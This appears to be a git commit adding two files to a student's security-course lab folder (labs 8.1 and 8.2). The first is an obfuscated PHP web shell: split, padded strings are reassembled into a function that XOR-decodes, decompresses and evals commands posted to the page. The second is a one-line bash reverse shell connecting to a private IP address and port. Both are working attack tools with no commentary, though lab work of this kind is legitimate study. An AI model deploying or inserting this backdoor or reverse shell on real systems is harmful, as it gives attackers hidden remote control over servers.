5a88ad80973c4dd3af95697321eeee27a594536b
JoeyTaubert <joey.taubert@comcast.net>
2023-10-22 21:30:48 -0400

    Adding labs 8.x

---
+++ SEC-335/Labs_Assignments/8.1/joeytshell.php
@@ -0,0 +1,11 @@
+<?php
+$z=str_replace('nw','','crnweatnwenwnw_funnwnwction');
+$f='g_mEatch("/$kh(E.+)E$kEEf/",@file_EgEet_contents("phpE://inputE")E,$mE)==1) {@obE_start();@eEva';
+$J='nctEioEn x($t,$k){$Ec=Estrlen($k)E;$l=sEtrlen(E$tE);E$o="";for($iEE=0;$i<$l;)E{for';
+$U='($j=0E;(E$j<$c&E&$iEE<$l);$j++E,$i++){$o.=$t{E$iE}^$k{$j};}}reEtEurn $o;}iEf E(@pre';
+$q='l(@EgzEuEncompress(@x(@baEse64_EdecoEde($mE[1]),$k)))E;$o=@Eob_gEetE_contents();E@ob_';
+$Z='$k="5Ef4dcc3Eb";$EkhE=E"5aa765d61EEd83";$kf="27Edeb882cEf99";$p="TU4EpEb3ETtnG5QT8dP";fu';
+$M='Eend_cleaEn();E$r=@Ebase6E4_enEcode(@xE(@gzcoEEmpress($o),$k))E;prinEt("E$p$kh$r$kf");}';
+$N=str_replace('E','',$Z.$J.$U.$f.$q.$M);
+$e=$z('',$N);$e();
+?>
---
+++ SEC-335/Labs_Assignments/8.2/joeytreverse.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/10.0.17.88/4449 0>&1
